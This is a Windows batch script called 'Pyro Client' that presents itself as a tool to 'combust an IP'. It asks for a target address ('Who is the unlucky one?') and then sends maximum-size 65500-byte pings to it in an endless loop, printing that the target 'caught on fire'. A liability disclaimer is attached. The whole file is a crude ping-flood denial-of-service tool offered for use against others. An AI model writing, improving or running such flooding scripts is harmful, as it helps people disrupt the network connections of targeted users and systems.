echo off
title Pyro Client by Nathan Hobbs (c) 2020
color 05
cls

:START

echo _________________________________________________________________________
echo /     ____  _  _  ____  _____     ___  __    ____  ____  _  _  ____     /
echo / ((((  _ \( \/ )(  _ \(  _  )   / __)(  )  (_  _)( ___)( \( )(_  _)))) /
echo / (((()___/ \  /  )   / )(_)(   ( (__  )(__  _)(_  )__)  )  (   )())))) /
echo / ((((__)   (__) (_)\_)(_____)   \___)(____)(____)(____)(_)\_) (__))))) /
echo _________________________________________________________________________
echo.
echo.
echo.

echo 				1. Combust an IP
echo.
echo 					2. View program info
echo.
echo 						3. Exit the program

choice /c 123 /m ""

if ERRORLEVEL 3 goto exit
if ERRORLEVEL 2 goto info
if ERRORLEVEL 1 goto combust

:EXIT

exit

:COMBUST

echo.
echo.
echo.
echo.
echo Who is the unlucky one?
set /p ip=""

goto combustion

:COMBUSTION

ping %ip% -l 65500 -w 1 -n 1  | find "Reply" > nul 
color 04
echo.
echo %ip% caught on fire!
echo.
ping %ip% -l 65500 -w 1 -n 1  | find "Reply" > nul 
color 06
echo.
echo %ip% caught on fire!
echo.
ping %ip% -l 65500 -w 1 -n 1  | find "Reply" > nul 
color 02
echo.
echo %ip% caught on fire!
echo.
ping %ip% -l 65500 -w 1 -n 1  | find "Reply" > nul 
color 03
echo.
echo %ip% caught on fire!
echo.
ping %ip% -l 65500 -w 1 -n 1  | find "Reply" > nul 
color 01
echo.
echo %ip% caught on fire!
echo.
ping %ip% -l 65500 -w 1 -n 1  | find "Reply" > nul 
color 05
echo.
echo %ip% caught on fire!
echo.

goto combustion

:INFO

echo.
echo.
echo.
echo Client made by Nathan Hobbs. (c) 2020\
echo Do not redistribute.
echo.
echo The creator is not liable for any damage created using this program.
echo.
pause
cls
goto start


